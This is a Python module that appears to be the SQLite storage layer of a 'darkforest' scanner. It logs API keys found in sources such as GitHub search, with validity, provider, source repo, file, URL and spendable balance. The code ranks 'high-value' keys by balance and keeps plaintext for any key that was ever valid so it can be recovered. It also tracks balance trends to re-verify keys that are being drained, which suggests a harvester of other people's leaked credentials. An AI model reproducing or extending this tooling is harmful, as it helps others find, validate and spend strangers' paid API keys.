"""SQLite key store — durable history + cross-run dedup.

Replaces ScannerEngine's "load every result JSON into memory" dedup with a
keyed table that also retains first_seen/last_seen across runs and is queryable.

Identity: ``key_hash`` (sha256) is the primary key for stable dedup; the full
``key`` is retained only for valid/transient-error rows; deterministic invalid
rows are hash-only. ``results/*.db`` is gitignored — local-only, and the
remaining valid credentials deserve the same handling as any production secret.
"""
from __future__ import annotations

import hashlib
import os
import sqlite3
from datetime import datetime
from pathlib import Path

DEFAULT_DB = os.path.join("results", "darkforest.db")
INVALID_REDACTED_KEY = "[invalid:redacted]"

_SCHEMA = """
CREATE TABLE IF NOT EXISTS keys (
    key_hash    TEXT PRIMARY KEY,
    key         TEXT NOT NULL,
    key_preview TEXT,
    provider    TEXT,
    source      TEXT,
    query       TEXT,
    repo        TEXT,
    file        TEXT,
    url         TEXT,
    valid       INTEGER,
    balance     REAL,
    currency    TEXT,
    status      TEXT,
    first_seen  TEXT,
    last_seen   TEXT
);
CREATE INDEX IF NOT EXISTS idx_keys_balance ON keys(balance DESC);
CREATE INDEX IF NOT EXISTS idx_keys_valid ON keys(valid);
CREATE INDEX IF NOT EXISTS idx_keys_key ON keys(key);  -- 调度器/重验按 key 查(last_seen 等)
CREATE INDEX IF NOT EXISTS idx_keys_invalid_retention
    ON keys(last_seen) WHERE valid = 0 AND status = 'invalid';
CREATE TABLE IF NOT EXISTS key_history (
    key_hash    TEXT,
    verified_at TEXT,
    balance_cny REAL,
    status      TEXT,
    valid       INTEGER
);
CREATE INDEX IF NOT EXISTS idx_key_history_hash ON key_history(key_hash, verified_at);
"""


def hash_key(key: str) -> str:
    """Stable identity hash for a credential (sha256 hex)."""
    return hashlib.sha256(key.encode()).hexdigest()


def connect(path: str | Path = DEFAULT_DB) -> sqlite3.Connection:
    """Open (creating if needed) the store at ``path`` and ensure schema.

    ``check_same_thread=False``: the connection is created by the main thread
    (``VerificationBroker.__init__``) but written by verification worker
    threads. sqlite3 serializes internally; callers must hold a lock around
    writes (see ``VerificationBroker._store_lock``).
    """
    Path(path).parent.mkdir(parents=True, exist_ok=True)
    conn = sqlite3.connect(str(path), check_same_thread=False)
    # 并发读守卫:watch 运行中用户跑 metrics/maintenance 打开同一库时,
    # 写入等待锁而不是立刻抛 "database is locked"(曾致启动历史读取被吞)。
    conn.execute("PRAGMA busy_timeout=5000")
    conn.row_factory = sqlite3.Row
    conn.executescript(_SCHEMA)
    columns = {row[1] for row in conn.execute("PRAGMA table_info(keys)")}
    if "query" not in columns:
        conn.execute("ALTER TABLE keys ADD COLUMN query TEXT")
    if "last_error" not in columns:
        # v2.5.3: error 行此前无一句原因,断点诊断只能靠重放探测——
        # 落 last_error 摘要(截断 200 字符),复验/排查有靶点。
        conn.execute("ALTER TABLE keys ADD COLUMN last_error TEXT")
    conn.commit()
    return conn


def _preview(key: str) -> str:
    return key[:10] + "..." + key[-4:] if len(key) >= 14 else key


def upsert(conn, result: dict) -> bool:
    """Insert a new key or refresh an existing one. Returns True if new."""
    key = result.get("key") or ""
    if not key:
        return False
    kh = hash_key(key)
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    repos = result.get("repos") or []
    repo_info = repos[0] if isinstance(repos, list) and repos else {}
    try:
        balance = float(result.get("balance_cny") or result.get("balance") or 0)
    except (TypeError, ValueError):
        balance = 0.0  # 上游脏数据("N/A"等)不应炸掉 worker 线程,按未知余额处理
    valid = bool(result.get("valid"))
    status = result.get("status", "")
    # 确定无效的凭据没有重验/调度价值，只需要 key_hash 做统计与去重；
    # error/rate_limited 仍是瞬态结果，保留原值便于同一进程内恢复判断。
    is_deterministic_invalid = not valid and status == "invalid"
    store_key = INVALID_REDACTED_KEY if is_deterministic_invalid else key
    key_preview = ("[invalid]" if is_deterministic_invalid
                   else (result.get("key_preview") or _preview(key)))
    # v2.5.3 currency 防御: provider∈PERCENT_PROVIDERS 强制 PERCENT——
    # 旁路落库路径绕过 _verify_one 的币种推断会把周额度%写成 CNY(DB 实证 2 条)。
    currency = result.get("primary_currency") or result.get("currency") or ""
    try:
        from providers import PERCENT_PROVIDERS
        if (result.get("provider") or "") in PERCENT_PROVIDERS:
            currency = "PERCENT"
    except Exception:
        pass
    # v2.5.3 last_error: 瞬态失败落 message 摘要;复验成功/确定无效时清空
    # (不留过期错误误导排查)。
    if status in ("error", "rate_limited"):
        last_error = str(result.get("message") or "")[:200] or None
    else:
        last_error = None

    row = conn.execute(
        "SELECT key, key_preview, valid, query FROM keys WHERE key_hash=?",
        (kh,)).fetchone()
    if row is not None:
        # 护栏与 redact_invalid_keys 同一不变量：key_history 有过 valid=1 的
        # 凭据明文不可被误判覆盖——只看 row["valid"] 不够（第一轮误判会把行置
        # valid=0，第二轮误判时护栏失效，明文被永久抹成脱敏标记）。
        if is_deterministic_invalid and (
                row["valid"]
                or conn.execute(
                    "SELECT 1 FROM key_history WHERE key_hash=? AND valid=1 LIMIT 1",
                    (kh,)).fetchone() is not None):
            # 曾经验证过有效的 key 在本次误判时先保留原值；
            # 后续 valid 结果可直接覆盖，避免误判破坏唯一可恢复凭据。
            store_key = row["key"]
            key_preview = row["key_preview"]
        query = result.get("query") or row["query"]
        # provider/key 一起更新：重新验证后平台识别或有效性结果可能变化。
        # （历史行曾把 source 当 provider 写入，如 'github_search'）
        conn.execute(
            "UPDATE keys SET last_seen=?, valid=?, balance=?, status=?, provider=?, "
            "key=?, key_preview=?, query=?, currency=?, last_error=? WHERE key_hash=?",
            (now, int(valid), balance, status,
             result.get("provider") or result.get("source") or "",
             store_key, key_preview, query or "unknown",
             currency, last_error, kh),
        )
        conn.commit()
        return False

    conn.execute(
        """INSERT INTO keys
            (key_hash, key, key_preview, provider, source, repo, file, url,
            valid, balance, currency, status, first_seen, last_seen, query, last_error)
           VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)""",
        (kh, store_key, key_preview,
         result.get("provider") or result.get("source") or "",
         result.get("source", ""), repo_info.get("repo", ""),
         repo_info.get("file", ""), repo_info.get("url", ""),
         int(bool(result.get("valid"))), balance,
         currency,
         result.get("status", ""), now, now,
         result.get("query") or "unknown", last_error),
    )
    conn.commit()
    return True


def high_value_keys(conn, min_balance: float = 1.0) -> set[str]:
    """Only keys with balance > min_balance — the dedup seed for watch restart.

    只保留高价值 key 做 _seen 种子：普通历史 key 重新走验证（可能余额变化/
    重新激活），扫描器扫到即提交，不会全被去重拒掉。
    """
    return {row["key"] for row in conn.execute(
        "SELECT key FROM keys WHERE valid = 1 AND balance > ?", (min_balance,))}


def redact_invalid_keys(conn) -> int:
    """确定性 invalid 行改为 hash-only，迁移旧库明文；返回脱敏行数。

    例外:曾经验证过有效的 key(key_history 有 valid=1)不脱敏——
    upsert 的误判护栏会把它的明文留在行里(唯一可恢复凭据),
    若这里照常脱敏,平台侧恢复(如 WAF 误拦解除)后凭据就永久丢失了。
    """
    cursor = conn.execute(
        "UPDATE keys SET key=?, key_preview=? "
        "WHERE valid=0 AND status='invalid' AND key<>? "
        "AND key_hash NOT IN (SELECT DISTINCT key_hash FROM key_history WHERE valid=1)",
        (INVALID_REDACTED_KEY, "[invalid]", INVALID_REDACTED_KEY))
    conn.commit()
    return cursor.rowcount


def prune_invalid_older_than(conn, days: float = 90, limit: int = 10_000) -> int:
    """删除超过保留期的确定性 invalid 行；返回删除数量。"""
    if days <= 0:
        raise ValueError("days must be positive")
    redact_invalid_keys(conn)
    rows = conn.execute(
        "SELECT key_hash FROM keys"
        " WHERE valid=0 AND status='invalid' AND last_seen IS NOT NULL"
        "   AND last_seen < datetime('now','localtime', ?)"
        " LIMIT ?",
        (f"-{float(days)} days", max(1, int(limit))),
    ).fetchall()
    hashes = [row["key_hash"] for row in rows]
    if hashes:
        # key_history 只写 valid 结果；valid→invalid 后清理 key 会留下孤儿历史。
        conn.executemany(
            "DELETE FROM key_history WHERE key_hash=?", [(h,) for h in hashes])
        conn.executemany(
            "DELETE FROM keys WHERE key_hash=?", [(h,) for h in hashes])
    conn.commit()
    return len(hashes)


def query(conn, valid_only: bool = False, min_balance: float = 0.0,
          limit: int = 1000) -> list[dict]:
    """Query stored keys ordered by balance desc."""
    sql = "SELECT * FROM keys WHERE balance >= ?"
    params: list = [min_balance]
    if valid_only:
        sql += " AND valid = 1"
    sql += " ORDER BY balance DESC LIMIT ?"
    params.append(limit)
    return [dict(r) for r in conn.execute(sql, params)]


def ledger_metrics(conn, min_balance: float = 1.0) -> dict:
    """返回聚合产出画像：候选、valid、invalid、高价值和状态分布。

    故意不返回 key/key_hash/key_preview：该接口用于调参，不应扩大凭据暴露面。
    """
    min_balance = float(min_balance)
    totals = conn.execute(
        "SELECT COUNT(*) AS candidates, "
        "COALESCE(SUM(valid),0) AS valid, "
        "COALESCE(SUM(CASE WHEN valid=0 THEN 1 ELSE 0 END),0) AS invalid, "
        "COALESCE(SUM(CASE WHEN valid=1 AND COALESCE(currency,'')<>'PERCENT' AND balance>? THEN 1 ELSE 0 END),0) AS high_value, "
        "COALESCE(ROUND(SUM(CASE WHEN valid=1 AND COALESCE(currency,'')<>'PERCENT' AND balance>? THEN balance ELSE 0 END),2),0) "
        "AS high_value_balance FROM keys",
        (min_balance, min_balance),
    ).fetchone()

    by_source = conn.execute(
        "SELECT COALESCE(NULLIF(source,''),'unknown') AS source, COUNT(*) AS candidates, "
        "COALESCE(SUM(valid),0) AS valid, "
        "COALESCE(SUM(CASE WHEN valid=0 THEN 1 ELSE 0 END),0) AS invalid, "
        "COALESCE(SUM(CASE WHEN valid=1 AND COALESCE(currency,'')<>'PERCENT' AND balance>? THEN 1 ELSE 0 END),0) AS high_value, "
        "COALESCE(ROUND(SUM(CASE WHEN valid=1 AND COALESCE(currency,'')<>'PERCENT' AND balance>? THEN balance ELSE 0 END),2),0) "
        "AS high_value_balance, MAX(last_seen) AS last_seen "
        "FROM keys GROUP BY COALESCE(NULLIF(source,''),'unknown') "
        "ORDER BY candidates DESC, source",
        (min_balance, min_balance),
    ).fetchall()

    by_provider = conn.execute(
        "SELECT COALESCE(NULLIF(provider,''),'unknown') AS provider, COUNT(*) AS candidates, "
        "COALESCE(SUM(valid),0) AS valid, "
        "COALESCE(SUM(CASE WHEN valid=0 THEN 1 ELSE 0 END),0) AS invalid, "
        "COALESCE(SUM(CASE WHEN valid=1 AND COALESCE(currency,'')<>'PERCENT' AND balance>? THEN 1 ELSE 0 END),0) AS high_value, "
        "COALESCE(ROUND(SUM(CASE WHEN valid=1 AND COALESCE(currency,'')<>'PERCENT' AND balance>? THEN balance ELSE 0 END),2),0) "
        "AS high_value_balance, MAX(last_seen) AS last_seen "
        "FROM keys GROUP BY COALESCE(NULLIF(provider,''),'unknown') "
        "ORDER BY candidates DESC, provider",
        (min_balance, min_balance),
    ).fetchall()

    by_query = conn.execute(
        "SELECT COALESCE(NULLIF(query,''),'unknown') AS query, COUNT(*) AS candidates, "
        "COALESCE(SUM(valid),0) AS valid, "
        "COALESCE(SUM(CASE WHEN valid=0 THEN 1 ELSE 0 END),0) AS invalid, "
        "COALESCE(SUM(CASE WHEN valid=1 AND COALESCE(currency,'')<>'PERCENT' AND balance>? THEN 1 ELSE 0 END),0) AS high_value, "
        "COALESCE(ROUND(SUM(CASE WHEN valid=1 AND COALESCE(currency,'')<>'PERCENT' AND balance>? THEN balance ELSE 0 END),2),0) "
        "AS high_value_balance, MAX(last_seen) AS last_seen "
        "FROM keys GROUP BY COALESCE(NULLIF(query,''),'unknown') "
        "ORDER BY candidates DESC, query",
        (min_balance, min_balance),
    ).fetchall()

    status_counts = {
        (row["status"] or "unknown"): row["n"]
        for row in conn.execute(
            "SELECT COALESCE(NULLIF(status,''),'unknown') AS status, COUNT(*) AS n "
            "FROM keys GROUP BY COALESCE(NULLIF(status,''),'unknown') ORDER BY n DESC")
    }
    return {
        "totals": dict(totals),
        "by_source": [dict(row) for row in by_source],
        "by_provider": [dict(row) for row in by_provider],
        "by_query": [dict(row) for row in by_query],
        "status_counts": status_counts,
    }


def record_history(conn, result: dict) -> None:
    """写一条余额历史(仅有效 key;无效不写,省空间)。"""
    if not result.get("valid"):
        return
    key = result.get("key") or ""
    if not key:
        return
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    conn.execute(
        "INSERT INTO key_history (key_hash, verified_at, balance_cny, status, valid) VALUES (?,?,?,?,?)",
        (hash_key(key), now, float(result.get("balance_cny") or 0),
         result.get("status", ""), 1),
    )
    conn.commit()


def get_last_history(conn, key_hash: str) -> dict | None:
    """该 key 最近一条验证历史;无则 None。"""
    row = conn.execute(
        "SELECT verified_at, balance_cny, status, valid FROM key_history "
        "WHERE key_hash=? ORDER BY verified_at DESC, rowid DESC LIMIT 1", (key_hash,)).fetchone()
    if row is None:
        return None
    return {"verified_at": row["verified_at"], "balance_cny": row["balance_cny"],
            "status": row["status"], "valid": row["valid"]}


def get_balance_trend(conn, key_hash: str, n: int = 5) -> float:
    """该 key 最近 n 次验证的余额趋势:正值=上升,负值=下降,0=平稳。

    返回 (最新余额 - 最早余额) / n,用于动态重验频率调整——
    余额下降快的 key 重验更勤(可能正在被使用/耗尽),稳定 key 拉长。
    """
    rows = conn.execute(
        "SELECT balance_cny FROM key_history WHERE key_hash=? "
        "ORDER BY verified_at DESC, rowid DESC LIMIT ?", (key_hash, n)).fetchall()
    if len(rows) < 2:
        return 0.0
    first = float(rows[-1]["balance_cny"] or 0)
    last = float(rows[0]["balance_cny"] or 0)
    return (last - first) / len(rows)
